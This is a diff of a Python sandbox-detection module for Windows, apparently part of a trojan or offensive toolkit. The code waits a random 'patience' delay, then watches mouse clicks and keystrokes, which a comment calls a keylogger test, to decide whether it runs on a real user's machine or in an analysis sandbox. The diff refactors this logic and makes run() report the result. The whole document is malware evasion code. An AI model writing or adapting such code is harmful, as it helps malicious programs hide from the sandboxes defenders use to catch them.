@@ -1,10 +1,8 @@
 #!/usr/bin/env python3
 import ctypes
-import msvcrt
 import win32api
 import random
 import time
-import sys
 import vk_keys
 
 vk = vk_keys.VK_Keys()
@@ -22,12 +20,10 @@ verbose = True
 test = False  # Set to True to run test for key presses (keylogger)
 
 
-class Last_Input_Info(ctypes.Structure):
-    _fields_ = [("cbSize", ctypes.c_uint),
-                ("dwTime", ctypes.c_ulong)]
-
-
 def vprint(verbose_string, lverbose=False):
+    '''
+    Provides easy way of adding line icons to print.
+    '''
     global verbose
     if lverbose or verbose:
         if lverbose:
@@ -35,6 +31,11 @@ def vprint(verbose_string, lverbose=False):
         else:
             icon = '*'
         print('[{}] {}'.format(icon, verbose_string), flush=True)
+
+
+class Last_Input_Info(ctypes.Structure):
+    _fields_ = [("cbSize", ctypes.c_uint),
+                ("dwTime", ctypes.c_ulong)]
 
 
 def get_last_input():
@@ -77,7 +78,7 @@ def get_key_press(last_key=None, key_list=key_list):
             return None
 
 
-def detect_sandbox():
+def detect_sandbox(patience=random.randint(7, 70)):
     '''
     Looks for mouse clicks, double clicks, and keystrokes to determine if
     this is a user machine or a sandbox environment
@@ -85,8 +86,7 @@ def detect_sandbox():
     global mouse_clicks
     global keystrokes
 
-    random_sleep_time = random.randint(7,70)  # Patience
-    time.sleep(random_sleep_time)
+    time.sleep(patience)  # Patience
 
     max_keystrokes = random.randint(12, 24)
     max_mouse_clicks = random.randint(7, 24)
@@ -202,8 +202,15 @@ def main(**args):
 def run(**args):
     if 'test' in args and args['test'] is True:
         return 'Sandbox detect could be running'
-    if 'time_delay' in args:
-        time_delay = args['time_delay']
+    if 'patience' in args:
+        patience = args['patience']
+    else:
+        patience = random.randint(7, 70)
+
+    if detect_sandbox(patience):
+        print('Sandbox checks failed.')
+    else:
+        print('We are ok!')
 
 
 if __name__ == '__main__':
